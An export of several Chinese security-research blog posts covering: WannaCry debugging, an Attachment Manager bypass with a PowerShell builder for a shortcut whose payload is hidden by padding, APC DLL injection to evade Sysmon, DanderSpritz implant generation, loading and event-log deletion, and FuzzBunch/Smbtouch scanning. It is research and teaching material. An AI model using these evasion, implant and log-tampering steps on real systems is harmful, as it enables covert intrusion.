    <content type="text"><![CDATA[0x00 前言 2017年5月12日全球爆发大规模蠕虫勒索软件WanaCrypt0r感染事件，各大厂商对该软件做了深入分析，但针对初学者的分析教程还比较少，复现过程需要解决的问题有很多，而且没有文章具体介绍勒索软件的实际运行流程，所以我写了这篇面向初学者的教程，希望帮助大家。 0x01 简介 本文将要介绍以下内容： 样本实际运行流程 IDA动态调试方法 具体调试tasksche.exe的过程 0x02 样本分析 测试环境： Win 7 x86 测试工具： IDA 6.8 样本下载地址： http://bbs.pediy.com/thread-217586-1.htm 经测试，该样本为WanaCrypt0r母体mssecsvc.exe释放出的敲诈者程序tasksche.exe 因此不包含“Kill Switch”开关和MS17-010漏洞利用代码 样本流程分析： 通过逆向分析，样本流程如下图 注: 样本流程图使用processon绘制，在线网址如下： https://www.processon.com/ 0x03 实际测试 1、启动IDA，加载样本文件wcry.exe找到WinMain(x,x,x,x)函数，在初始位置下断点（快捷键F2），如下图 2、启动调试器选择Debugger（快捷键F9） 选择Local Win32 debugger，如下图 选择Debugger-Continue process（快捷键F9）,进入调试界面，如下图 3、开始单步调试单步步入快捷键F7 单步步过快捷键F8 执行到 call sub_401225，按F7单步步入，查看该函数的反汇编代码，如下图 为了便于分析，可以输入快捷键F5查看伪代码，如下图 通过代码猜测该函数的功能如下: 调用GetComputerNameW函数获得计算机名 使用rand函数生成一个随机数 二者结合生成一个唯一的ID 动态执行至该函数结束，寄存器EAX的值保存函数返回结果，对应到上述函数，EAX寄存器保存的是生成的ID值 EAX的地址为0040F8AC，查看该内存地址的内容为vxdxwoohuuxv276，即生成的ID值为vxdxwoohuuxv276 以上操作过程如下图 继续调试，执行到jnz short loc_40208E，可看到程序出现分支，IDA会自动提示接下来要执行的分支为左侧(该分支会闪烁)，如下图 对照前文的样本流程图，可知此时并未进入安装模式 4、修改启动参数，进入安装模式为了进入安装模式，需要在程序启动时加入参数/i 现在退出调试模式，选择Debugger-Process options，填入参数/i,如下图 再次启动调试，执行到jnz short loc_40208E，程序跳入右侧分支，进入安装模式，如下图 继续调试，执行到call sub_401B5F 该函数的功能如下图 依次尝试在c:\ProgramData、c:\Intel、%Temp%文件夹下创建以ID为名称的文件夹，直到成功为止 执行完该语句，查看路径c:\ProgramData，发现新生成的文件夹vxdxwoohuuxv276，如下图 继续调试，接下来的功能为将程序自身复制到上述目录，如下图 执行到call sub_401F5D,该函数的功能如下: 创建服务，服务名称和显示名称均以ID命名，启动参数为cmd.exe /c “C:\ProgramData\vxdxwoohuuxv276\tasksche.exe”，对应子函数sub_401CE8，如下图 创建互斥量Global\MsWinZonesCacheCounterMutexA，用来避免程序重复启动,对应子函数sub_401EFF，如下图 注： 由于服务设置成自动执行，所以安装服务后会自动执行C:\ProgramData\vxdxwoohuuxv276\tasksche.exe，不出意外，你的测试系统此时已经弹出勒索软件的主界面，如下图 至此，安装模式结束，如下图，接下来完成对左侧分支的调试 5、将启动参数取消，重新进入调试模式，进入左侧分支如下图 执行到call sub_4010FD，该函数的功能如下: 创建注册表项HKEY_LOCAL_MACHINE\Software\WanaCrypt0r\wd 键值为程序绝对路径，如下图 执行到call sub_401DAB，该函数释放资源中的PE文件，文件包含： b.wnry c.wnry r.wnry s.wnry t.wnry taskdl.exe taskse.exe u.wnry msg(目录) 如下图 执行到call sub_401E9E，该函数功能如下: 加密c.wnry文件的第一行内容13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94（软件作者的比特币地址） 继续调试，接下来执行cmd命令： attrib.exe +h 用于将当前文件夹设置为隐藏属性，如下图 接着执行cmd命令： icacls.exe . /grant Everyone:F /T /C /Q 用于为当前文件夹添加权限用户组Everyone，主要用来开放访问权限，如下图 执行到call sub_40170A,该函数用来动态获取API地址，主要为了实现接下来的内存加载dll 执行到call sub_4014A6，该函数用来解密dll，可以在特殊位置下断点，从内存dump出该dll文件 通过分析代码，发现解密函数位于sub_403A77，如下图 对应该函数，函数执行前，EAX保存解密数据长度，函数执行后，EBX保存解密dll文件的起始地址 完整过程如下图 函数执行前查看寄存器EAX的值，解密长度为0x10000(截图未体现) 001790C8保存解密dll文件的起始地址 将以上解密数据（数据范围001790C8-001890C8）dump并保存成dll文件，使用ida打开，识别为dll文件，导出函数为TaskStart 注： 我已将解密的dll文件提取并上传至github，地址如下： https://github.com/3gstudent/WanaCrypt0r-Reverse-Analysis/blob/master/crypt.dll1 继续调试，执行到call sub_402924，该函数用来内存加载dll，传入导出函数TaskStart 至此，tasksche.exe任务完成，接下来的工作交由dll实现 0x04 小结 本文介绍了如何使用IDA对WanaCrypt0r中tasksche.exe进行动态调试，接下来会带来对解密dll的逆向分析过程，介绍WanaCrypt0r的加密流程 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[An interesting way of bypassing Windows Attachment Manager]]></title>
    <url>%2Fposts%2Fa4e2b7dd.html</url>
    <content type="text"><![CDATA[0x00 前言 最近看到了一篇文章《Bypassing Windows Attachment Manager》，作者rvrsh3ll@424f424f，文中介绍了他绕过Windows Attachment Manager的思路，很有趣。恰好我对文中涉及到的ADS和lnk文件利用有过研究，所以，本文将结合我的一些心得，对该绕过方法做拓展介绍，并分享一个我在实际测试过程中发现的有趣问题 相关文章地址如下： 《Bypassing Windows Attachment Manager》： http://www.rvrsh3ll.net/blog/informational/bypassing-windows-attachment-manager/ 我之前的一些研究心得： 《渗透技巧——快捷方式文件的参数隐藏技巧》： https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%82%E6%95%B0%E9%9A%90%E8%97%8F%E6%8A%80%E5%B7%A7/ 《Hidden Alternative Data Streams的进阶利用技巧》： https://3gstudent.github.io/3gstudent.github.io/Hidden%20Alternative%20Data%20Streams%E7%9A%84%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/ 0x01 简介 本文将要介绍以下内容： Windows Attachment Manager作用 Windows Attachment Manager实现方式 Windows Attachment Manager的绕过思路 特殊文件的构造 实际测试过程中发现的有趣问题 0x02 Windows Attachment Manager 简介 自WinXp SP2开始，微软推出的新功能 用来防止文件从非信任的途径下载后可以直接执行 非信任的途径包括邮件和互联网下载 如果发现文件来自于非信任的途径，那么该文件在打开时会弹框提示用户，需要用户确认才能执行，如图 被标记为High-risk的文件格式如下： .ade,.adp,.app,.asp,.bas,.bat,.cer,.chm,.cmd,.com,.cpl,.crt,.csh,.exe,.fxp,.hlp,.hta,.inf,.ins,.isp,.its,.js,.jse,.ksh,.lnk,.mad,.maf,.mag,.mam,.maq,.mar,.mas,.mat,.mau,.mav,.maw,.mda,.mdb,.mde,.mdt,.mdw,.mdz,.msc,.msi,.msp,.mst,.ops,.pcd,.pif,.prf,.prg,.pst,.reg,.scf,.scr,.sct,.shb,.shs,.tmp,.url,.vb,.vbe,.vbs,.vsmacros,.vss,.vst,.vsw,.ws,.wsc,.wsf,.wsh 详细资料可参考： https://support.microsoft.com/en-us/help/883260/information-about-the-attachment-manager-in-microsoft-windows 实现方式不可信的文件在下载时会被添加ADS:Zone.Identifier:$DATA ADS详细内容如下： [ZoneTransfer] ZoneId=3 也就是说，只要包含ADS:Zone.Identifier:$DATA，那么该文件在打开时就会弹框提示用户，需要用户确认才能执行 绕过思路1、删除文件的ADS，那么在打开该文件的时候就不会弹框 对于小文件，可以使用Windows默认命令more 对于大文件，可使用工具Streams 注： 细节可参考《Hidden Alternative Data Streams的进阶利用技巧》 也可通过界面操作，如下图，选择Unblock 2、改变传输途径 如果将文件复制到另一操作系统，原文件的ADS不会保存 也就是说，将之前下载的非信任文件通过可信方式复制到另一操作系统，那么该文件在新系统是不会被标记为“不可信”的 例如： 从互联网下载的文件python-2.7.12.msi，默认被添加ADS:Zone.Identifier:$DATA，打开时会弹框 现在将该文件拖到虚拟机中(该操作被认为是可信方式，不会被添加ADS)，而且原ADS不会保存，所以在打开该文件的过程不会弹框 0x03 特殊文件的构造 既然不可信的文件在下载时会被添加ADS:Zone.Identifier:$DATA，那么如果是压缩后的文件呢？解压缩后是否还会包含ADS？ 测试系统： Win10x64 HTTP服务器： Kali Linux 开启HTTP服务器功能： python -m SimpleHTTPServer 80 1、尝试.exe+.rar 使用WinRAR将putty.exe压缩成putty.rar，上传至HTTP服务器 注： Win10系统默认无法解压缩.rar文件，需要手动安装WinRAR 测试系统通过Chrome下载putty.rar，如图 使用WinRAR解压缩并打开文件，未弹框 结论1： .rar内的压缩文件不会被添加ADS 2、尝试.lnk+.rar 压缩lnk文件时会直接对lnk指向的源文件压缩，无法压缩lnk文件本身，测试失败 3、尝试.exe+zip 使用WinRAR将putty.exe压缩成putty.zip，上传至HTTP服务器 测试系统通过Chrome下载putty.zip 通过Windows Explorer打开zip文件，如下图 打开后弹框，提示用户，如下图 而使用WinRAR解压缩并打开文件，并未弹框 结论2： Windows Attachment Manager不支持WinRAR这类第三方软件 4、尝试.exe+cab 接下来没必要测试需要第三方软件才能使用的压缩格式，应该继续寻找Windows系统默认支持的格式 比如.cab文件 注： cab文件可通过makecab.exe生成，系统默认包含 压缩类型包括：none，mszip，lzx 使用makecab将putty.exe压缩成putty.cab，压缩类型选择lzx，命令如下： makecab /d compressiontype=lzx putty.exe putty.cab 如图 上传至HTTP服务器 测试系统通过Chrome下载 解压缩，保存文件，打开，弹框 将文件拖至任一路径，打开，不弹框 完整测试过程如图 gif在线地址： https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/2.gif 使用Procmon监控两种操作，区别如下图，此处需要继续研究，做更多的测试 注： Win10 Build 14393(1607)及之前版本均存在这个问题,Win10 Build 15063(1703)已经修复该问题 结论3： 使用cab压缩文件，接着拖动文件保存，能够绕过Windows Attachment Manager 5、尝试.lnk+cab 注： 该方法来自rvrsh3ll@424f424f的文章，但我在测试的时候发现了另外一个有趣的问题 使用makecab将test.lnk压缩成test.cab，压缩类型选择lzx，命令如下： makecab /d compressiontype=lzx test.lnk test.cab 注： cab文件能够压缩lnk文件本身，为了增加迷惑性，可以使用以下测试代码： test.txt中写入如下内容： /c start calc.exe powershell代码： $file = Get-Content &quot;c:\test\test.txt&quot; $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&quot;c:\test\test.lnk&quot;) $Shortcut.TargetPath = &quot;%SystemRoot%\system32\cmd.exe&quot; $Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,3&quot; $Shortcut.Arguments = $file $Shortcut.Save() 生成的lnk文件参数被空格字符填充，实际payload被隐藏，如下图 更多细节可参考： 《渗透技巧——快捷方式文件的参数隐藏技巧》 将test.cab上传至HTTP服务器 测试系统通过Chrome下载 解压缩，保存文件，打开，弹框（同测试4） 将文件拖至任一路径，打开，不弹框（同测试4） 一个有趣的问题： 将lnk文件解压缩，保存文件，打开，弹框 接着右键查看lnk文件属性，再次打开lnk文件，不弹框，ADS被清除 完整测试过程如图 gif在线地址： https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-10/1.gif 结论4： 在某些特殊情况下(Win10 Build 14393(1607)之前的版本)，ADS会清除，导致能够绕过Windows Attachment Manager 注： Win10 Build 10586存在该问题，Win10 Build 14393(1607)修复了该问题 0x04 补充 Win7系统不存在以上问题，原因： 打开cab文件后，在保存文件时会弹框提示用户(该特性Win10不存在) 如图 0x05 小结 不可信的文件在下载时会被添加ADS:Zone.Identifier:$DATA 如果将文件复制到另一操作系统，原文件的ADS不会保存 相比于rar和zip格式，使用cab格式压缩lnk文件更为合适 lnk文件欺骗性更高 Win10 Build 15063(1703)已经修复以上bug LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[通过APC实现Dll注入——绕过Sysmon监控]]></title>
    <url>%2Fposts%2Fa172839b.html</url>
    <content type="text"><![CDATA[0x00 前言 要对指定进程进行远程注入，通常使用Windows提供的API CreateRemoteThread创建一个远程线程，进而注入dll或是执行shellcode Sysmon可用来监控和记录系统活动，可记录CreateRemoteThread操作 注入的方法不只有CreateRemoteThread，能否通过其他注入方式绕过Sysmon的监控呢？ Casey Smith@subTee在他的文章中给出了答案： Shellcode Injection via QueueUserAPC - Hiding From Sysmon 地址如下： http://subt0x10.blogspot.com/2017/01/shellcode-injection-via-queueuserapc.html 0x01 简介 本文将要介绍如下内容： Sysmon配置测试，监控CreateRemoteThread操作 c++实现通过APC对Dll注入 绕过Sysmon测试 Casey Smith@subTee分享的C#实现代码和用途 Sysmon：可用来监控和记录系统活动，并记录到windows事件日志，包含如下事件： Event ID 1: Process creation Event ID 2: A process changed a file creation time Event ID 3: Network connection Event ID 4: Sysmon service state changed Event ID 5: Process terminated Event ID 6: Driver loaded Event ID 7: Image loaded Event ID 8: CreateRemoteThread Event ID 9: RawAccessRead Event ID 10: ProcessAccess Event ID 11: FileCreate Event ID 12: RegistryEvent (Object create and delete) Event ID 13: RegistryEvent (Value Set) Event ID 14: RegistryEvent (Key and Value Rename) Event ID 15: FileCreateStreamHash Event ID 255: Error 详情见https://technet.microsoft.com/en-us/sysinternals/sysmon 注： CreateRemoteThread为Event ID 8 Dll注入常见方法： 创建新线程 设置线程上下背景文，修改寄存器 插入Apc队列 修改注册表 挂钩窗口消息 远程手动实现LoadLibrary 引用自http://www.cnblogs.com/uAreKongqi/p/6012353.html Shellcode Injection via QueueUserAPC - Hiding From Sysmon：c#实现，通过调用QueueUserAPC执行shellcode，可应用于InstallUtil.exe和Msbuild.exe，能够绕过Sysmon对Event ID 8: CreateRemoteThread的监控 文章地址： http://subt0x10.blogspot.com/2017/01/shellcode-injection-via-queueuserapc.html 0x02 Sysmon简介 下载地址： https://technet.microsoft.com/en-us/sysinternals/sysmon 以系统服务和驱动的方式安装在系统上 用来监控和记录系统活动，并记录到windows事件日志中 提供进程创建、网络连接以及文件创建时间更改等操作的详细信息 通过事件日志，可识别异常活动，了解攻击者在网络上的操作 注： 系统安装Sysmon后，新增服务Sysmon 如图 也就是说，如果攻击者获得了主机权限，通过查看已安装服务可以看到Sysmon的安装 安装以默认配置安装： sysmon -accepteula –i -n 以配置文件安装： sysmon -c config.xml 配置文件config.xml格式示例如下： 注： xml大小写敏感 &lt;Sysmon schemaversion=&quot;3.20&quot;&gt; &lt;!-- Capture all hashes --&gt; &lt;HashAlgorithms&gt;*&lt;/HashAlgorithms&gt; &lt;EventFiltering&gt; &lt;!-- Log all drivers except if the signature --&gt; &lt;!-- contains Microsoft or Windows --&gt; &lt;DriverLoad onmatch=&quot;exclude&quot;&gt; &lt;Signature condition=&quot;contains&quot;&gt;microsoft&lt;/Signature&gt; &lt;Signature condition=&quot;contains&quot;&gt;windows&lt;/Signature&gt; &lt;/DriverLoad&gt; &lt;!-- Do not log process termination --&gt; &lt;ProcessTerminate onmatch=&quot;include&quot; /&gt; &lt;!-- Log network connection if the destination port equal 443 --&gt; &lt;!-- or 80, and process isn&#39;t InternetExplorer --&gt; &lt;NetworkConnect onmatch=&quot;include&quot;&gt; &lt;DestinationPort&gt;443&lt;/DestinationPort&gt; &lt;DestinationPort&gt;80&lt;/DestinationPort&gt; &lt;/NetworkConnect&gt; &lt;NetworkConnect onmatch=&quot;exclude&quot;&gt; &lt;Image condition=&quot;end with&quot;&gt;iexplore.exe&lt;/Image&gt; &lt;/NetworkConnect&gt; &lt;/EventFiltering&gt; &lt;/Sysmon&gt; 注： 该示例引用自http://www.freebuf.com/sectool/122779.html 查看配置sysmon -c 注： 配置属性保存在注册表如下位置： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SysmonDrv\Parameters 如图 查看日志记录1.通过面板 位置如下： Control Panel\System and Security-View event logs Applications and Services Logs-Microsoft-Windows-Sysmon-Operational 如图 2.通过powershell查看，命令如下： (管理员权限) Get-WinEvent -FilterHashtable @{logname=&quot;Microsoft-Windows-Sysmon/Operational&quot;;} 监控并记录CreateRemoteThread配置文件如下： &lt;Sysmon schemaversion=&quot;3.20&quot;&gt; &lt;!-- Capture all hashes --&gt; &lt;HashAlgorithms&gt;*&lt;/HashAlgorithms&gt; &lt;EventFiltering&gt; &lt;!-- Log all drivers except if the signature --&gt; &lt;!-- contains Microsoft or Windows --&gt; &lt;CreateRemoteThread onmatch=&quot;include&quot;&gt; &lt;TargetImage condition=&quot;end with&quot;&gt;calc.exe&lt;/TargetImage&gt; &lt;/CreateRemoteThread&gt; &lt;/EventFiltering&gt; &lt;/Sysmon&gt; 保存为RecordCreateRemoteTh.xml 注： 该配置文件表示对进程calc.exe监控，如果捕获到CreateRemoteThread，将会写入事件日志 安装配置文件： Sysmon.exe -c RecordCreateRemoteTh.xml 如图 查看配置信息 Sysmon.exe -c 如图 启动calc.exe 执行CreateRemoteTh.exe，calc.exe被注入，弹框，如图 CreateRemoteTh.exe的源代码可参照： https://github.com/3gstudent/CreateRemoteThread/blob/master/CreateRemoteThreadTest.cpp 查看日志，发现Event ID 8 如下图，检测到CreateRemoteThread 通过powershell查看Event ID 8 Get-WinEvent -FilterHashtable @{logname=&quot;Microsoft-Windows-Sysmon/Operational&quot;;ID=8} 如下图，获取日志Event ID 8 0x03 c++实现通过APC对Dll注入 使用APC注入： 代码如下： https://github.com/3gstudent/Inject-dll-by-APC/blob/master/test.cpp 关于代码的详细说明可参照： http://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/ 如图，成功注入到calc.exe 使用ProcessExplorer查看calc.exe加载的dll，如下图，成功注入testdll 查看日志，并没有产生Event ID 8，成功绕过Sysmon对CreateRemoteThread的监控 0x04 Casey Smith@subTee分享的C#实现代码和用途 可应用到 InstallUtil.exe和Msbuild.exe的利用上面 InstallUtil.exe： https://gist.github.com/subTee/7bbd8e995ed8e8b1f8dab1dc926def8a Msbuild.exe： https://gist.github.com/subTee/cf3e1b06cf58fcc9e0255190d30c2d38 调用过程中没有产生Event ID 8 0x05 小结 本文对Sysmon的监控功能做了测试，并介绍如何通过APC实现Dll注入，绕过Sysmon对CreateRemoteThread的监控 在特定环境下，如果无法手动关闭Sysmon服务，利用APC能在一定程度上绕过Sysmon对CreateRemoteThread的监控 参考资料： http://subt0x10.blogspot.com/2017/01/shellcode-injection-via-queueuserapc.html https://www.darkoperator.com/blog/2014/8/8/sysinternals-sysmon http://www.freebuf.com/sectool/122779.html http://www.cnblogs.com/uAreKongqi/p/6012353.html http://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/ LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[NSA DanderSpiritz测试指南——木马生成与测试]]></title>
    <url>%2Fposts%2F47bf6e7a.html</url>
    <content type="text"><![CDATA[0x00 前言 DanderSpritz是NSA的一款界面化的远控工具，基于FuzzBunch框架，执行Start.jar即可启动 在实际测试过程中，由于缺少说明文档，遇到的问题有很多，同时一些细节也值得深入研究 所以本文将要帮助大家答疑解惑，分享测试心得，结合木马特点分析防御思路 0x01 简介 本文将要介绍以下内容： 执行pc_prep无法获得回显的原因及解决方法 Pc同Pc2.2的区别 level3和level4木马代表的含义及如何使用 各类型木马区别 dll木马利用方式 Windows单条日志删除功能 木马查杀思路 0x02 实际测试 测试环境： Win7 x86 安装如下工具： python2.6 pywin32 jdk 1、下载fuzzbunch参考链接： https://github.com/3gstudent/fuzzbunch 注： 我fork了公开的fuzzbunch项目(https://github.com/fuzzbunch/fuzzbunch)，并添加了部分内容，解决了一个bug，具体内容会在后面介绍 2、直接运行Start.jar如图 设置启动参数，Log Directory需要设置成固定格式：c:\logs\xxx(xxx任意名称) 否则，会出现报错，如下图 注： 网上的部分分析文章认为应该先用fb.py生成一个日志文件，接着Start.jar指向该目录，其实不需要，只要路径格式正确即可 3、执行pc_prep配置木马输入pc_prep获得回显，如下图 注： 有很多人在测试的时候发现输入pc_prep无法获得回显，如下图 原因： fuzzbunch工程下载自如下链接： https://github.com/x0rz/EQGRP_Lost_in_Translation 文件缺失，导致该错误 正确的下载位置： https://github.com/fuzzbunch/fuzzbunch 但是，下载后还需要补全缺失的文件，才能完全正常使用 我fork了上述工程，并补全了缺失文件，下载我的github即可解决上述问题，地址如下： https://github.com/3gstudent/fuzzbunch 补充： 在之前的测试过程中，使用了存在bug的版本，虽然pc_prep无法获得回显，但是使用pc2.2_prep可以生成木马 如下图 可是木马无法回连 猜测原因： pc相对于Pc2.2版本更高，低版本已经不再使用 查看\Resources\Pc2.2\Version.xml，显示：PeddleCheap 2.2.0.2 表示Pc2.2对应的PeddleCheap版本为2.2.0.2 查看\Resources\Pc\Version.xml，显示：PeddleCheap 2.3.0 表示Pc对应的PeddleCheap版本为2.3.0 注： PeddleCheap用来操作同木马通信，在DanderSpritz主面板显示 4、木马分类可选择的木马类型如下： 1) - Standard TCP (i386-winnt Level3 sharedlib) 2) - HTTP Proxy (i386-winnt Level3 sharedlib) 3) - Standard TCP (i386-winnt Level3 exe) 4) - HTTP Proxy (i386-winnt Level3 exe) 5) - Standard TCP (x64-winnt Level3 sharedlib) 6) - HTTP Proxy (x64-winnt Level3 sharedlib) 7) - Standard TCP (x64-winnt Level3 exe) 8) - HTTP Proxy (x64-winnt Level3 exe) 9) - Standard TCP Generic (i386-winnt Level4 sharedlib) 10) - HTTP Proxy Generic (i386-winnt Level4 sharedlib) 11) - Standard TCP AppCompat-enabled (i386-winnt Level4 sharedlib) 12) - HTTP Proxy AppCompat-enabled (i386-winnt Level4 sharedlib) 13) - Standard TCP UtilityBurst-enabled (i386-winnt Level4 sharedlib) 14) - HTTP Proxy UtilityBurst-enabled (i386-winnt Level4 sharedlib) 15) - Standard TCP WinsockHelperApi-enabled (i386-winnt Level4 sharedlib) 16) - HTTP Proxy WinsockHelperApi-enabled (i386-winnt Level4 sharedlib) 17) - Standard TCP (i386-winnt Level4 exe) 18) - HTTP Proxy (i386-winnt Level4 exe) 19) - Standard TCP (x64-winnt Level4 sharedlib) 20) - HTTP Proxy (x64-winnt Level4 sharedlib) 21) - Standard TCP AppCompat-enabled (x64-winnt Level4 sharedlib) 22) - HTTP Proxy AppCompat-enabled (x64-winnt Level4 sharedlib) 23) - Standard TCP WinsockHelperApi-enabled (x64-winnt Level4 sharedlib) 24) - HTTP Proxy WinsockHelperApi-enabled (x64-winnt Level4 sharedlib) 25) - Standard TCP (x64-winnt Level4 exe) 26) - HTTP Proxy (x64-winnt Level4 exe) 按平台区分： x86 x64 按文件格式区分： exe dll 按通信协议区分: Standard TCP HTTP Proxy 按功能区分： Standard AppCompat-enabled UtilityBurst-enabled WinsockHelperApi-enabled 按Level区分： Level3 Level4 注： 经实际测试，Level代表回连方式 level3表示反向连接，控制端监听端口，等待回连 leve4表示正向连接，目标主机监听端口，等待控制端主动连接 5、木马测试选择代表性的进行测试 (1) Level3，选择 3) - Standard TCP (i386-winnt Level3 exe) 按配置生成exe(此处不具体介绍，参照其他文章) DanderSpiritz控制端选择PeddleCheap-Listen-Start Listening 在目标主机直接执行exe 等待回连 操作同正常的反向连接木马 注： 日志文件下生成2个文件PC_Level3_exe.base和PC_Level3_exe.configured PC_Level3_exe.base为模板文件，来自于\Resources\Pc\Level3\i386-winnt\release PC_Level3_exe.configured为加入配置参数的文件 两个文件大小相同，但在特定位置存在差异，如下图 (2) Level3，选择 6) - HTTP Proxy (x64-winnt Level3 sharedlib) 按配置生成PC_Level3_http_dll.configured(此处不具体介绍，参照其他文章) 加载方式： 1.利用DoublePulsar加载dll (此处不具体介绍，参照其他文章) 2.手动加载dll 使用dumpbin查看dll的导出函数，如下图 ordinal为1对应的dll导出函数名为rst32 也就是说，我们可以尝试通过rundll32直接加载该dll 命令行代码如下： rundll32 PC_Level3_http_dll.configured,rst32 木马正常回连 注： 对于http协议的木马，记得设置listen协议的时候要选择http (3) Level4，选择 17) - Standard TCP (i386-winnt Level4 exe) 按配置生成PC_Level4_exe.configured(可使用高级模式，指定固定监听端口) 启动exe后执行netstat -ano可看到开启了固定端口 DanderSpiritz控制端选择PeddleCheap-Connect，选择ip，填入Level 4对应的端口 正向连接 (4) Level4，选择 9) - Standard TCP Generic (i386-winnt Level4 sharedlib) 按配置生成PC_Level4_dll.configured(可使用高级模式，指定固定监听端口) 查看其导出函数，如下图 也就是说，不支持直接通过rundll32加载 猜测： Level4的木马要一直运行在后台，考虑到隐蔽性，所以不支持该功能 给出一种dll加载的测试方法：通过APC注入 如下图，成功加载，打开监听端口 参考代码： https://github.com/3gstudent/Inject-dll-by-APC/blob/master/test.cpp 注： 被注入的程序需要管理员权限，否则会因为权限问题无法打开监听端口 给出另一种dll加载的测试方法：通过Application Compatibility Shims 可参考以下链接： https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/ 如下图，成功加载，打开监听端口 (5) Level4，选择 11) - Standard TCP AppCompat-enabled (i386-winnt Level4 sharedlib) 根据字面意思，猜测是支持Application Compatibility Shims 比较Generic和AppCompat-enabled的区别： 二者大小一样，就是AppCompat-enabled多了一个导出函数GetHookAPIs 如下图 0x03 木马功能 木马连接成功后，自动开始信息搜集，返回各种详细信息 比较人性化的设计是会自动询问用户是否提权 在检测到环境安全后会询问用户是否需要导出hash 待信息搜集完成后，输入help可获得支持的操作 注： help获得的内容不完整，输入aliases可获得更多操作命令介绍 help+命令可获得具体命令的操作介绍 例如，输入help eventlogedit，回显如图 1、日志操作功能关于日志操作的命令如下： eventlogclear eventlogedit eventlogfilter eventlogquery 具体功能如下： eventlogquery： 统计日志列表，查询所有日志信息，包含时间，数目 可查询指定类别的日志信息，包含时间，数目，命令如下： eventlogquery -log Setup 该操作等价于 wevtutil.exe gli setup 注： wevtutil.exe操作系统默认包含 eventlogfilter： 查看指定类别的日志内容 命令如下： eventlogfilter -log Setup -num 19 该操作等价于 wevtutil qe /f:text setup eventlogedit： 删除单条日志 可删除单条日志内容，命令如下： eventlogedit -log Setup -record 1 注：record序号可通过eventlogfilter获得 该命令暂没有公开工具支持 eventlogclear： 删除该类日志所有内容 命令如下： eventlogclear -log Microsoft-Windows-Dhcpv6-Client/Admin 该操作等价于 wevtutil cl Microsoft-Windows-Dhcpv6-Client/Admin 0x04 木马查杀思路 DanderSpritz的木马生成方式如下： 文件夹\Resources\Pc\Level3和\Resources\Pc\Level4下保存模板文件，固定位置预留参数配置信息，实际生成时向模板文件写入配置信息 目前杀毒软件已经对这些模板文件成功识别并查杀，同时，这些模板文件的代码并没有开源，也会提高在恶意利用上面的门槛 建议普通用户： 更新系统补丁 更新杀毒软件病毒库 就能够防范该工具的攻击 0x05 小结 本文分享了DanderSpiritz的测试心得，希望能够帮助大家在技术研究上对其有更好的认识，省略了部分具体利用细节和章节，以防该工具被滥用 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[内网安全——利用NSA Smbtouch批量检测内网]]></title>
    <url>%2Fposts%2Fca5cea8f.html</url>
    <content type="text"><![CDATA[0x00 前言 最近，NSA渗透工具被曝光，其中包含多个Windows远程漏洞利用工具，影响很大 本文不会具体介绍这些远程漏洞工具的使用方法，而是站在防御者的角度，介绍如何利用这些工具，更好的去保护自己的内网 0x01 简介 本文将要介绍以下内容： FuzzBunch使用流程 Smbtouch功能介绍 编写python脚本实现批量检测内网是否存在可被SMB和NBT协议攻击的漏洞 根据日志掌握内网主机信息 检测的SMB和NBT远程提权漏漏洞列表如下： ETERNALBLUE ETERNALCHAMPION ETERNALROMANCE ETERNALSYNERGY 注： 个人认为，以上四个漏洞危害最大，尤其适用于内网工作组环境 0x02 FuzzBunch FuzzBunch框架，类似于metasploit，包含探测、攻击、利用等各种功能(仅根据目前泄露的资料) 下载地址： https://github.com/fuzzbunch/fuzzbunch 注： fuzzbunch提取自https://github.com/x0rz/EQGRP_Lost_in_Translation 1. 配置环境安装python2.6，参考下载地址： http://dl.nexiao.com/file.html?url=http%3A//b9.gpxz.net/201402/python-2_gpxz.6_gpxz.6_gpxz.rar 安装pywin32，参考下载地址： https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download 2. 添加环境变量 c:\python263. 执行fb.py进入命令行操作模式报错 原因： 泄露的资料里缺少listeningposts文件夹 解决办法： 在shadowbroker-master\windows\下创建个listeningposts文件夹 或者修改fb.py,修改好的文件可在如下链接下载： https://raw.githubusercontent.com/3gstudent/test/master/fb.py 再次执行fb.py,成功 如图 注： 执行start_lp.py可进入界面操作模式，如下图，此处不再过多介绍 4. 设置启动参数如下：[?] Default Target IP Address [] :[?] Default Callback IP Address [] :[?] Use Redirection [yes] :[?] Base Log directory [D:\logs] : 进入fb的shell后输入use，可获得支持的插件目录： Plugin Category: Touch ====================== Name Versi ---- ----- Architouch 1.0.0 Domaintouch 1.1.1 Eclipsedwingtouch 1.0.4 Educatedscholartouch 1.0.0 Emeraldthreadtouch 1.0.0 Erraticgophertouch 1.0.1 Esteemaudittouch 2.1.0 Explodingcantouch 1.2.1 Iistouch 1.2.2 Namedpipetouch 2.0.0 Printjobdelete 1.0.0 Printjoblist 1.0.0 Rpctouch 2.1.0 Smbtouch 1.1.1 Webadmintouch 1.0.1 Worldclienttouch 1.0.1 Plugin Category: ImplantConfig ============================== Name Version ---- ------- Darkpulsar 1.1.0 Mofconfig 1.0.0 Plugin Category: Exploit ======================== Name Version ---- ------- Easybee 1.0.1 Easypi 3.1.0 Eclipsedwing 1.5.2 Educatedscholar 1.0.0 Emeraldthread 3.0.0 Emphasismine 3.4.0 Englishmansdentist 1.2.0 Erraticgopher 1.0.1 Eskimoroll 1.1.1 Esteemaudit 2.1.0 Eternalromance 1.4.0 Eternalsynergy 1.0.1 Ewokfrenzy 